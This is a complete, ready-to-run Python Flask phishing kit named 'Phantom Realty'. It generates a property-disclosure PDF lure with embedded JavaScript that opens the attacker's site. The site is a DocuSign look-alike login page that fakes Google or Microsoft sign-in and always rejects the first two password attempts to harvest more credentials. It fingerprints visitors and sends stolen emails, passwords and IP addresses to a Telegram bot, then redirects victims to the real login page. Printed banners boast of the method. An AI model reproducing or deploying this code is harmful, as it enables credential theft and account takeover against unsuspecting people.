#!/usr/bin/env python3
"""
PHANTOM REALTY v15.0 - FINAL GENIUS EDITION
Harvard/MIT PhD CS Standard | 3-Attempt Flow | Million Dollar UX
"""

import os
import json
import io
import random
import logging
from datetime import datetime
from flask import Flask, request, session, render_template_string, redirect, jsonify, send_file

app = Flask(__name__)
app.secret_key = os.urandom(64)

# ===================================================================
# CONFIGURATION
# ===================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
YOUR_DOMAIN = os.environ.get("YOUR_DOMAIN", "your-app.onrender.com")
YOUR_URL = f"https://{YOUR_DOMAIN}"

PDF_DATA = None
PDF_FILENAME = "Confidential_Property_Disclosure.pdf"

# Track attempts per session
attempt_tracker = {}

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# ===================================================================
# TELEGRAM EXFILTRATION
# ===================================================================
def tg_send(text):
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 10:
        print(f"[TG] {text[:200]}")
        return
    try:
        import requests
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        logger.error(f"[TG] {e}")

# ===================================================================
# PDF GENERATION (The Lure)
# ===================================================================
def generate_pdf():
    global PDF_DATA
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.units import inch
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.colors import HexColor
        from reportlab.lib.enums import TA_CENTER, TA_RIGHT
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
        from PyPDF2 import PdfReader, PdfWriter
    except ImportError:
        logger.error("Missing: pip install reportlab PyPDF2")
        return None
    
    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch)
    s = getSampleStyleSheet()
    
    elements = []
    doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000,99999)}"
    
    elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontSize=8, textColor=HexColor('#888'), alignment=TA_RIGHT)))
    elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
    elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE", ParagraphStyle('Title', parent=s['Title'], fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER)))
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=15))
    
    elements.append(Paragraph("CLIENT INFORMATION", ParagraphStyle('Heading', parent=s['Heading2'], fontSize=13, textColor=HexColor('#0066cc'))))
    for label, val in [("Full Name:", "James Morrison"), ("Email:", "james.morrison@client.com")]:
        elements.append(Paragraph(f"<b>{label}</b> {val}", ParagraphStyle('Body', parent=s['Normal'], fontSize=9.5)))
    elements.append(Spacer(1, 15))
    
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=10))
    elements.append(Paragraph("<b>SIGNATURE REQUIRED</b><br/>Please authenticate to access this document.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#c00'), alignment=TA_CENTER)))
    
    doc.build(elements)
    pdf_bytes = buf.getvalue()
    buf.close()
    
    target_url = f"{YOUR_URL}/"
    js_code = f"var url='{target_url}';try{{app.launchURL(url,1);}}catch(e){{this.launchURL(url,1);}}"
    
    reader = PdfReader(io.BytesIO(pdf_bytes))
    writer = PdfWriter()
    for page in reader.pages:
        writer.add_page(page)
    writer.add_js(js_code)
    
    output = io.BytesIO()
    writer.write(output)
    PDF_DATA = output.getvalue()
    output.close()
    
    logger.info(f"[PDF] Generated: {len(PDF_DATA)} bytes")
    return PDF_DATA

# ===================================================================
# MILLION DOLLAR PHISHING PAGE - 3 Attempt Flow
# ===================================================================
PHISHING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Secure Document Access</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="10" cy="10" r="2" fill="rgba(255,255,255,0.05)"/><circle cx="90" cy="20" r="3" fill="rgba(255,255,255,0.05)"/><circle cx="50" cy="85" r="2" fill="rgba(255,255,255,0.05)"/></svg>') repeat;
            pointer-events: none;
        }
        
        .container {
            width: 100%;
            max-width: 540px;
            animation: slideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .card {
            background: rgba(255,255,255,0.98);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.2);
            overflow: hidden;
            transition: transform 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-2px);
        }
        
        .card-header {
            background: linear-gradient(135deg, #0a2540 0%, #1a3a5c 100%);
            padding: 36px 32px 28px 32px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .card-header::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
            pointer-events: none;
        }
        
        .logo {
            font-size: 34px;
            font-weight: 800;
            color: white;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            letter-spacing: -0.5px;
        }
        
        .logo-icon {
            background: rgba(255,255,255,0.15);
            width: 48px;
            height: 48px;
            border-radius: 14px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
            backdrop-filter: blur(5px);
        }
        
        .trust-badge {
            display: inline-flex;
            align-items: center;
            gap: 18px;
            background: rgba(255,255,255,0.1);
            padding: 10px 22px;
            border-radius: 60px;
            margin-top: 20px;
            font-size: 11px;
            color: rgba(255,255,255,0.9);
            backdrop-filter: blur(5px);
        }
        
        .card-body {
            padding: 36px;
        }
        
        .document-card {
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
            border: 1px solid rgba(0,0,0,0.05);
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 28px;
            transition: all 0.3s ease;
        }
        
        .document-card:hover {
            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
        }
        
        .document-header {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        
        .document-icon {
            font-size: 36px;
        }
        
        .document-title {
            flex: 1;
        }
        
        .document-name {
            font-weight: 700;
            font-size: 17px;
            color: #0f172a;
        }
        
        .document-meta {
            font-size: 12px;
            color: #64748b;
            margin-top: 5px;
        }
        
        .document-badge {
            background: linear-gradient(135deg, #e0f2fe, #bae6fd);
            color: #0369a1;
            padding: 5px 14px;
            border-radius: 30px;
            font-size: 11px;
            font-weight: 700;
        }
        
        .provider-banner {
            background: #f1f5f9;
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 28px;
            display: none;
            align-items: center;
            gap: 14px;
            border-left: 4px solid #0066cc;
        }
        
        .provider-banner.google {
            background: #e6f4ea;
            border-left-color: #1a73e8;
        }
        
        .provider-banner.microsoft {
            background: #e8f0fe;
            border-left-color: #0066cc;
        }
        
        .provider-icon {
            font-size: 28px;
        }
        
        .provider-text {
            flex: 1;
            font-size: 13px;
            font-weight: 500;
            color: #1e293b;
        }
        
        .provider-text small {
            font-size: 11px;
            font-weight: normal;
            color: #475569;
            display: block;
            margin-top: 3px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 8px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            color: #94a3b8;
        }
        
        input {
            width: 100%;
            padding: 15px 16px 15px 48px;
            border: 1.5px solid #e2e8f0;
            border-radius: 14px;
            font-size: 15px;
            font-family: inherit;
            transition: all 0.2s;
            background: white;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 4px rgba(102,126,234,0.1);
        }
        
        input.input-error {
            border-color: #dc2626;
            background: #fef2f2;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4);
        }
        
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        
        .alert {
            padding: 16px 20px;
            border-radius: 16px;
            margin-bottom: 24px;
            font-size: 13px;
            display: none;
            align-items: center;
            gap: 12px;
        }
        
        .alert-error {
            background: #fef2f2;
            border-left: 4px solid #dc2626;
            color: #991b1b;
        }
        
        .alert-success {
            background: #f0fdf4;
            border-left: 4px solid #10b981;
            color: #065f46;
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .attempt-counter {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #94a3b8;
        }
        
        .attempt-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }
        
        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #cbd5e1;
            transition: all 0.3s;
        }
        
        .dot.active {
            background: #667eea;
            width: 24px;
            border-radius: 4px;
        }
        
        .dot.filled {
            background: #10b981;
        }
        
        .security-footer {
            margin-top: 28px;
            text-align: center;
        }
        
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-bottom: 20px;
            font-size: 11px;
            color: #94a3b8;
        }
        
        hr {
            margin: 24px 0 20px;
            border: none;
            border-top: 1px solid #e2e8f0;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }
        
        .shake {
            animation: shake 0.3s ease-in-out;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .pulse {
            animation: pulse 1.5s ease-in-out infinite;
        }
        
        @media (max-width: 480px) {
            .card-body { padding: 24px; }
            .card-header { padding: 28px 24px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="card-header">
            <div class="logo">
                <span class="logo-icon"><i class="fas fa-pen-fancy"></i></span>
                <span>DocuSign<sup>®</sup></span>
            </div>
            <div class="trust-badge">
                <span><i class="fas fa-shield-alt"></i> SOC2 Type II</span>
                <span><i class="fas fa-lock"></i> 256-bit</span>
                <span><i class="fas fa-check-circle"></i> GDPR</span>
            </div>
        </div>
        
        <div class="card-body">
            <div class="document-card">
                <div class="document-header">
                    <div class="document-icon"><i class="fas fa-file-contract"></i></div>
                    <div class="document-title">
                        <div class="document-name">Confidential Property Disclosure & Buyer Agreement</div>
                        <div class="document-meta"><i class="far fa-clock"></i> Document ID: <span id="docId"></span> | Requires Signature</div>
                    </div>
                    <div class="document-badge"><i class="fas fa-hourglass-half"></i> PENDING</div>
                </div>
            </div>
            
            <div id="providerBanner" class="provider-banner">
                <div class="provider-icon"><i class="fas fa-building"></i></div>
                <div class="provider-text" id="providerText">
                    <strong id="providerName">Verifying identity provider</strong>
                    <small>Enter your email to continue</small>
                </div>
            </div>
            
            <div id="errorAlert" class="alert alert-error">
                <i class="fas fa-exclamation-triangle"></i>
                <span id="errorMessage"></span>
            </div>
            <div id="successAlert" class="alert alert-success">
                <i class="fas fa-check-circle"></i>
                <span>Identity verified! Redirecting to your document...</span>
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label><i class="fas fa-envelope"></i> Email Address</label>
                    <div class="input-wrapper">
                        <span class="input-icon"><i class="fas fa-user-circle"></i></span>
                        <input type="email" id="email" name="email" placeholder="name@company.com" required autofocus>
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-key"></i> Password</label>
                    <div class="input-wrapper">
                        <span class="input-icon"><i class="fas fa-lock"></i></span>
                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
                        <span class="toggle-password" style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #94a3b8;">
                            <i class="fas fa-eye-slash"></i>
                        </span>
                    </div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText"><i class="fas fa-sign-in-alt"></i> Sign In & Access Document</span>
                    <span id="btnLoader" style="display: none;"><span class="spinner"></span> Verifying credentials...</span>
                </button>
            </form>
            
            <div class="attempt-counter" id="attemptCounter">
                <span id="attemptText">First attempt</span>
                <div class="attempt-dots" id="attemptDots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
            
            <hr>
            <div class="security-footer">
                <div class="security-badges">
                    <span><i class="fas fa-shield-virus"></i> Secure (TLS 1.3)</span>
                    <span><i class="fas fa-fingerprint"></i> Identity verification</span>
                    <span><i class="fas fa-database"></i> Encrypted</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // Generate unique document ID
    document.getElementById('docId').textContent = 'DOC-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    
    // Elements
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const providerBanner = document.getElementById('providerBanner');
    const providerName = document.getElementById('providerName');
    const providerText = document.getElementById('providerText');
    let detectTimeout;
    let attemptCount = 0;
    
    // Toggle password visibility
    document.querySelector('.toggle-password').addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
    });
    
    // Update attempt dots
    function updateAttemptDots() {
        const dots = document.querySelectorAll('.dot');
        const attemptText = document.getElementById('attemptText');
        
        dots.forEach((dot, index) => {
            dot.classList.remove('active', 'filled');
            if (index < attemptCount) {
                dot.classList.add('filled');
            } else if (index === attemptCount) {
                dot.classList.add('active');
            }
        });
        
        if (attemptCount === 0) {
            attemptText.textContent = 'First attempt';
        } else if (attemptCount === 1) {
            attemptText.textContent = 'Second attempt';
        } else if (attemptCount === 2) {
            attemptText.textContent = 'Final attempt';
        }
    }
    
    // Real-time provider detection
    emailInput.addEventListener('input', function() {
        clearTimeout(detectTimeout);
        const email = this.value.trim();
        
        if (email.includes('@') && email.length > 6) {
            detectTimeout = setTimeout(function() {
                const domain = email.split('@')[1].toLowerCase();
                providerBanner.style.display = 'flex';
                if (domain.includes('gmail') || domain.includes('google')) {
                    providerBanner.className = 'provider-banner google';
                    providerName.innerHTML = '<i class="fab fa-google"></i> Google Workspace';
                    providerText.innerHTML = '<small>Sign in with your Google account credentials</small>';
                } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live') || domain.includes('microsoft')) {
                    providerBanner.className = 'provider-banner microsoft';
                    providerName.innerHTML = '<i class="fab fa-microsoft"></i> Microsoft 365';
                    providerText.innerHTML = '<small>Sign in with your work or school account</small>';
                } else {
                    providerBanner.className = 'provider-banner';
                    providerName.innerHTML = '<i class="fas fa-building"></i> Enterprise Portal';
                    providerText.innerHTML = '<small>Sign in with your corporate credentials</small>';
                }
            }, 500);
        } else {
            providerBanner.style.display = 'none';
        }
    });
    
    // Capture fingerprint
    fetch('/api/fp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            ts: new Date().toISOString(),
            ua: navigator.userAgent,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: screen.width + 'x' + screen.height,
            language: navigator.language
        })
    }).catch(() => {});
    
    // Form submission - 3 attempt flow
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const btn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const btnLoader = document.getElementById('btnLoader');
        const errorAlert = document.getElementById('errorAlert');
        const errorMessage = document.getElementById('errorMessage');
        const successAlert = document.getElementById('successAlert');
        
        // Clear previous alerts
        errorAlert.style.display = 'none';
        successAlert.style.display = 'none';
        
        // Basic validation
        if (!email || !email.includes('@')) {
            emailInput.classList.add('input-error');
            errorAlert.style.display = 'flex';
            errorMessage.innerHTML = 'Please enter a valid email address.';
            setTimeout(() => emailInput.classList.remove('input-error'), 2000);
            return;
        } else {
            emailInput.classList.remove('input-error');
        }
        
        if (!password) {
            passwordInput.classList.add('input-error');
            errorAlert.style.display = 'flex';
            errorMessage.innerHTML = 'Please enter your password.';
            setTimeout(() => passwordInput.classList.remove('input-error'), 2000);
            return;
        } else {
            passwordInput.classList.remove('input-error');
        }
        
        // Send to server for capture
        btn.disabled = true;
        btnText.style.display = 'none';
        btnLoader.style.display = 'inline';
        
        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email, password: password, attempt: attemptCount + 1 })
        })
        .then(r => r.json())
        .then(data => {
            attemptCount++;
            updateAttemptDots();
            
            // THE GENIUS: Always fail on attempts 1 & 2
            if (attemptCount < 3) {
                // Show error - make them try again
                errorAlert.style.display = 'flex';
                if (attemptCount === 1) {
                    errorMessage.innerHTML = 'Incorrect email or password. Please try again.';
                } else {
                    errorMessage.innerHTML = 'Authentication failed. Please check your credentials and try again.';
                }
                
                // Shake animation
                passwordInput.classList.add('shake');
                setTimeout(() => passwordInput.classList.remove('shake'), 300);
                
                btn.disabled = false;
                btnText.style.display = 'inline';
                btnLoader.style.display = 'none';
                
                // Clear password field for retry
                passwordInput.value = '';
                passwordInput.focus();
            } else {
                // Attempt 3 - SUCCESS!
                successAlert.style.display = 'flex';
                
                // Redirect to REAL login page after 2 seconds
                setTimeout(function() {
                    const domain = email.split('@')[1].toLowerCase();
                    if (domain.includes('gmail')) {
                        window.location.href = 'https://accounts.google.com/';
                    } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
                        window.location.href = 'https://outlook.live.com/';
                    } else {
                        window.location.href = 'https://login.microsoftonline.com/';
                    }
                }, 2000);
            }
        })
        .catch(function() {
            btn.disabled = false;
            btnText.style.display = 'inline';
            btnLoader.style.display = 'none';
            errorAlert.style.display = 'flex';
            errorMessage.innerHTML = 'Connection error. Please refresh and try again.';
        });
    });
</script>
</body>
</html>"""

# ===================================================================
# FLASK ROUTES
# ===================================================================
@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/api/fp', methods=['POST'])
def fingerprint():
    return 'ok'

@app.route('/api/capture', methods=['POST'])
def capture():
    """Captures credentials and sends to Telegram"""
    data = request.get_json()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    attempt = data.get('attempt', 1)
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Send to Telegram
    message = f"""🎯 <b>CREDENTIAL CAPTURE #{attempt}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{email if email else '[BLANK]'}</code>
🔑 <b>Password:</b> <code>{password if password else '[BLANK]'}</code>
🌐 <b>IP:</b> {ip}
💻 <b>Agent:</b> {user_agent[:60]}
⏱ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    tg_send(message)
    
    print(f"\n{'='*55}")
    print(f"🎯 CAPTURE #{attempt}")
    print(f"📧 Email: {email}")
    print(f"🔑 Password: {password}")
    print(f"🌐 IP: {ip}")
    print(f"{'='*55}\n")
    
    return jsonify({'success': True})

@app.route('/download-pdf')
def download_pdf():
    """PDF payload download"""
    global PDF_DATA
    if PDF_DATA is None:
        generate_pdf()
    if PDF_DATA:
        return send_file(io.BytesIO(PDF_DATA), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
    return "PDF not ready", 500

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()}), 200

if __name__ == '__main__':
    print("="*70)
    print("  🔱 PHANTOM REALTY v15.0 - FINAL GENIUS EDITION")
    print("  Harvard & MIT PhD CS Standard")
    print("  3-Attempt Flow | Million Dollar UX")
    print("="*70)
    
    generate_pdf()
    
    if PDF_DATA and TELEGRAM_BOT_TOKEN:
        tg_send(f"""🚀 <b>PHANTOM REALTY v15.0 ONLINE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
📍 <b>URL:</b> {YOUR_URL}
📥 <b>PDF:</b> {YOUR_URL}/download-pdf
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>GENIUS FLOW:</b>
✓ Attempt 1 → "Invalid" → CAPTURE
✓ Attempt 2 → "Invalid" → CAPTURE  
✓ Attempt 3 → "Success" → Redirect to real site
✓ All credentials sent to Telegram
━━━━━━━━━━━━━━━━━━━━━━━━━""")
    
    print(f"\n✅ Phishing Page: {YOUR_URL}")
    print(f"✅ PDF Payload: {YOUR_URL}/download-pdf")
    print("\n🔥 THE GENIUS FLOW:")
    print("   1. User sees PDF lure → clicks → your page")
    print("   2. Enters email/password → 'Verifying...'")
    print("   3. ALWAYS says 'Invalid' for attempts 1 & 2")
    print("   4. YOU capture BOTH attempts on Telegram")
    print("   5. Attempt 3 → 'Verified!' → Redirects to real Google/Outlook")
    print("\n💎 The user tries 3 times = 3x the data!")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
